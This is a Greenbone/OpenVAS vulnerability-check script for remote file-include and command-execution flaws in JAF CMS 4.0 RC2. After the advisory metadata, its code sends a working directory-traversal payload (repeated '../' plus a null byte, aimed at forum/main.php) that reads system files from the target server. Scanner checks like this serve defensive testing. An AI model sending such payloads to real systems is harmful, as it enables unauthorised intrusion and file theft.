if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100895" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-11-05 13:21:25 +0100 (Fri, 05 Nov 2010)" );
	script_bugtraq_id( 44664 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "JAF CMS Multiple Remote File Include and Remote Shell Command Execution Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44664" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/514625" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/514626" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/rfi_in_jaf_cms.html" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/shell_create__command_execution_in_jaf_cms.html" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "JAF CMS is prone to an shell-command-execution vulnerability and
multiple remote file-include vulnerabilities because the application
fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit the remote shell-command-execution issue
to execute arbitrary shell commands in the context of the
webserver process.

An attacker can exploit remote file-include issues to include
arbitrary remote files containing malicious PHP code and execute it in
the context of the webserver process. This may allow the attacker to
compromise the application and the underlying system. Other attacks
are also possible." );
	script_tag( name: "affected", value: "JAF CMS 4.0 RC2 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/jaf", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = NASLString( dir, "/module/forum/main.php?website=", crap( data: "../", length: 3 * 9 ), files[file], "%00" );
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

